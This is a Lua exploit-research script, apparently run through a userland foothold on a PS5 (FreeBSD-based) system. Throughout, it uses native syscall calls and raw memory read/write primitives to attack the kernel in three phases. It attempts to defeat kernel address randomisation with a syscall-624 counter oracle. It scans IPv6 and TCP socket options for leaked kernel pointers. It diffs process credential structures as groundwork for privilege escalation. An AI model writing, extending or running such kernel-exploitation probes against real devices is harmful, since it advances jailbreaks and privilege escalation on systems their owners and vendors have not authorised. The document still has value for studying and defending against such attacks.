-- CRASH_CLASS: MODERATE
-- PROBE 145a: KASLR defeat via sys 624 timing oracle + socket option scan
--
-- Context: sys 624 is a monotonic VM operation counter (+5 per mmap).
-- Hypothesis: certain kernel operations that touch kernel VA may produce
-- measurably different 624 deltas depending on whether the VA is mapped.
-- If we can detect whether a kernel page exists at a guessed address,
-- we can binary-search the kernel base (slides in 2MB increments).
--
-- Also: exhaustive getsockopt scan on IPv6 sockets — some FreeBSD
-- socket options return struct sizes that encode kernel addresses.
-- Plus: scan process credentials struct via sys 587 for any bits
-- that changed after socket/thread operations.

print("=== PROBE 145a: KASLR ORACLE + SOCKOPT SCAN ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h ~= 0xFFFFFFFF
end

collectgarbage("stop")

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

local has_rax = native and native.fcall_with_rax
local stub = has_rax and syscall.pipe.fn_addr or nil
if not has_rax then
    print("NEED native.fcall_with_rax — aborting")
    print("=== PROBE 145a COMPLETE ===")
    return
end

-- ============================================================
-- PHASE 1: sys 624 timing oracle
-- ============================================================
print("")
print("--- PHASE 1: SYS 624 TIMING ORACLE ---")

-- Baseline: measure 624 delta for normal mmap/munmap
local base_deltas = {}
for i = 1, 20 do
    local before = to_num(native.fcall_with_rax(stub, 624))
    local m = to_num(native.fcall_with_rax(stub, 477, 0, 0x4000, 3, 0x1002, 0xFFFFFFFF, 0))
    local after = to_num(native.fcall_with_rax(stub, 624))
    if m > 0 then
        native.fcall_with_rax(stub, 73, m, 0x4000)
    end
    base_deltas[i] = after - before
end

-- Calculate baseline stats
local sum = 0
for _, d in ipairs(base_deltas) do sum = sum + d end
local avg = sum / #base_deltas
print(string.format("mmap delta: avg=%.1f samples=%d first5: %d %d %d %d %d",
    avg, #base_deltas, base_deltas[1], base_deltas[2], base_deltas[3],
    base_deltas[4], base_deltas[5]))

-- Now test: does mincore(2) on kernel VA produce different 624 delta?
-- mincore probes were dead (ret=-1), but the delta might still differ
local kernel_bases = {}
-- FreeBSD kernel typically at 0xFFFFFFFF80000000 + slide
-- PS5 slide range unknown, try common bases
for slide = 0, 0x10000000, 0x200000 do
    local hi = 0xFFFFFFFF
    local lo = 0x80000000 + slide
    kernel_bases[#kernel_bases + 1] = {hi, lo}
    if #kernel_bases >= 32 then break end
end

local prev_624 = to_num(native.fcall_with_rax(stub, 624))
local anomalous = {}

for i, kb in ipairs(kernel_bases) do
    local addr_hi, addr_lo = kb[1], kb[2]
    local addr = uint64(string.format("0x%X%08X", addr_hi, addr_lo))

    -- Try sysctl with kernel VA as buffer — will fail but measure delta
    local before = to_num(native.fcall_with_rax(stub, 624))

    -- mincore(addr, PAGE_SIZE, vec) — will return -1 but kernel touches VA
    local vec = memory.alloc(8)
    safe_wq(vec, uint64(0))
    pcall(function()
        native.fcall_with_rax(stub, 78, to_num(addr), 0x4000, to_num(vec))
    end)

    local after = to_num(native.fcall_with_rax(stub, 624))
    local delta = after - before

    if delta ~= 0 then
        anomalous[#anomalous + 1] = {addr_hi, addr_lo, delta}
        print(string.format("  0x%08X_%08X: delta=%d", addr_hi, addr_lo, delta))
    end
end

print("Anomalous 624 deltas: " .. #anomalous .. " / " .. #kernel_bases)
print("canary1: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))

-- ============================================================
-- PHASE 2: Exhaustive getsockopt scan
-- ============================================================
print("")
print("--- PHASE 2: GETSOCKOPT SCAN ---")

local sock6 = to_num(native.fcall_with_rax(stub, 97, 28, 2, 0))
print("IPv6 socket fd=" .. sock6)

if sock6 >= 0 then
    -- Set PKTINFO to allocate pktopts
    local pi = memory.alloc(0x20)
    safe_wq(pi, uint64(0))
    native.fcall_with_rax(stub, 105, sock6, 41, 46, to_num(pi), 20)

    local optbuf = memory.alloc(0x400)
    local optlen_buf = memory.alloc(4)

    -- Scan IPPROTO_IPV6 (41) options 0-100
    local kptr_opts = 0
    for opt = 0, 100 do
        safe_wq(optbuf, uint64(0))
        safe_wd(optlen_buf, 0x400)
        local gr = to_num(native.fcall_with_rax(stub, 118, sock6, 41, opt, to_num(optbuf), to_num(optlen_buf)))
        if gr == 0 then
            local got_len = safe_rd(optlen_buf)
            if got_len and got_len > 4 then
                local found = false
                for off = 0, got_len - 1, 8 do
                    local v = safe_rq(optbuf + off)
                    if is_kptr(v) then
                        found = true
                        kptr_opts = kptr_opts + 1
                        print(string.format("  *** OPT %d len=%d +0x%X: %s ***", opt, got_len, off, fmt_addr(v)))
                    end
                end
                if not found and got_len > 8 then
                    print(string.format("  opt %d: ret=0 len=%d (no kptr)", opt, got_len))
                end
            end
        end
    end

    -- Scan SOL_SOCKET (0xFFFF) options
    for opt = 0, 50 do
        safe_wq(optbuf, uint64(0))
        safe_wd(optlen_buf, 0x400)
        local gr = to_num(native.fcall_with_rax(stub, 118, sock6, 0xFFFF, opt, to_num(optbuf), to_num(optlen_buf)))
        if gr == 0 then
            local got_len = safe_rd(optlen_buf)
            if got_len and got_len > 8 then
                for off = 0, got_len - 1, 8 do
                    local v = safe_rq(optbuf + off)
                    if is_kptr(v) then
                        print(string.format("  *** SOL_SOCKET opt %d +0x%X: %s ***", opt, off, fmt_addr(v)))
                        kptr_opts = kptr_opts + 1
                    end
                end
            end
        end
    end

    -- Scan IPPROTO_TCP (6) on a TCP socket
    local tcp_sock = to_num(native.fcall_with_rax(stub, 97, 2, 1, 6))
    if tcp_sock >= 0 then
        for opt = 0, 50 do
            safe_wq(optbuf, uint64(0))
            safe_wd(optlen_buf, 0x400)
            local gr = to_num(native.fcall_with_rax(stub, 118, tcp_sock, 6, opt, to_num(optbuf), to_num(optlen_buf)))
            if gr == 0 then
                local got_len = safe_rd(optlen_buf)
                if got_len and got_len > 8 then
                    for off = 0, got_len - 1, 8 do
                        local v = safe_rq(optbuf + off)
                        if is_kptr(v) then
                            print(string.format("  *** TCP opt %d +0x%X: %s ***", opt, off, fmt_addr(v)))
                            kptr_opts = kptr_opts + 1
                        end
                    end
                end
            end
        end
        native.fcall_with_rax(stub, 6, tcp_sock)
    end

    print("Kernel pointers in sockopt: " .. kptr_opts)
    native.fcall_with_rax(stub, 6, sock6)
end

print("canary2: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))

-- ============================================================
-- PHASE 3: Credential struct diff after operations
-- ============================================================
print("")
print("--- PHASE 3: CREDENTIAL DIFF ---")

-- Read sys 587 (credential metadata) before and after socket ops
local cred_before = memory.alloc(0x100)
safe_wq(cred_before, uint64(0))
local cr1 = to_num(native.fcall_with_rax(stub, 587, to_num(cred_before), 0x100))
print("sys587 before: ret=" .. cr1)

-- Do a bunch of socket operations
for i = 1, 20 do
    local s = to_num(native.fcall_with_rax(stub, 97, 28, 2, 0))
    if s >= 0 then
        local pi2 = memory.alloc(0x20)
        safe_wq(pi2, uint64(0))
        native.fcall_with_rax(stub, 105, s, 41, 46, to_num(pi2), 20)
        native.fcall_with_rax(stub, 6, s)
    end
end

local cred_after = memory.alloc(0x100)
safe_wq(cred_after, uint64(0))
local cr2 = to_num(native.fcall_with_rax(stub, 587, to_num(cred_after), 0x100))
print("sys587 after: ret=" .. cr2)

-- Compare
local diffs = 0
for off = 0, 0xF0, 8 do
    local v1 = safe_rq(cred_before + off)
    local v2 = safe_rq(cred_after + off)
    if v1 and v2 then
        local h1, l1 = get_hi_lo(v1)
        local h2, l2 = get_hi_lo(v2)
        if h1 ~= h2 or l1 ~= l2 then
            diffs = diffs + 1
            print(string.format("  +0x%02X: %s -> %s", off, fmt_addr(v1), fmt_addr(v2)))
        end
    end
end
print("Credential diffs: " .. diffs)

local vm = to_num(native.fcall_with_rax(stub, 624))
print("sys624 VM counter=" .. vm)

print("")
print("canary_final: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))
print("=== PROBE 145a COMPLETE ===")
